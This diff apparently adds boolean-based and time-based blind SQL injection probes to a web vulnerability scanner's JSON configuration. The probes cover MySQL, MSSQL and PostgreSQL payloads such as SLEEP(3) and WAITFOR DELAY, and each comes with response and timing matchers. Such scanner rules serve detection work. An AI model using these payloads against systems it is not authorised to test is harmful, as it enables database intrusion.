@@ -184,6 +184,91 @@
           "variables": {}
         }
       ]
+    },
+    "blind_boolean": {
+      "description": "Boolean-based blind SQL injection — detects by response content differences",
+      "tech_match": [],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "user_id", "cat", "item_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}} AND 1=1",
+          "description": "Boolean true condition (should return same as baseline)",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word_count_diff", "min_diff": 0}
+          ],
+          "severity": "info",
+          "confidence_boost": 0,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=2",
+          "description": "Boolean false condition (should differ from baseline if injectable)",
+          "matchers": [
+            {"type": "word_count_diff", "min_diff": 3}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND '1'='1",
+          "description": "String-context boolean true",
+          "matchers": [
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "info",
+          "confidence_boost": 10,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND '1'='2",
+          "description": "String-context boolean false (different response = blind SQLi)",
+          "matchers": [
+            {"type": "word_count_diff", "min_diff": 3}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
+    },
+    "blind_time": {
+      "description": "Time-based blind SQL injection with differential timing",
+      "tech_match": [],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "user_id", "cat"],
+      "probes": [
+        {
+          "payload": "{{baseline}}; WAITFOR DELAY '0:0:3'--",
+          "description": "MSSQL time-based blind (3 second delay)",
+          "matchers": [
+            {"type": "timing", "min_ms": 2500}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND SLEEP(3)-- -",
+          "description": "MySQL time-based blind (3 second delay)",
+          "matchers": [
+            {"type": "timing", "min_ms": 2500}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT pg_sleep(3)--",
+          "description": "PostgreSQL time-based blind (3 second delay)",
+          "matchers": [
+            {"type": "timing", "min_ms": 2500}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
     }
   }
 }
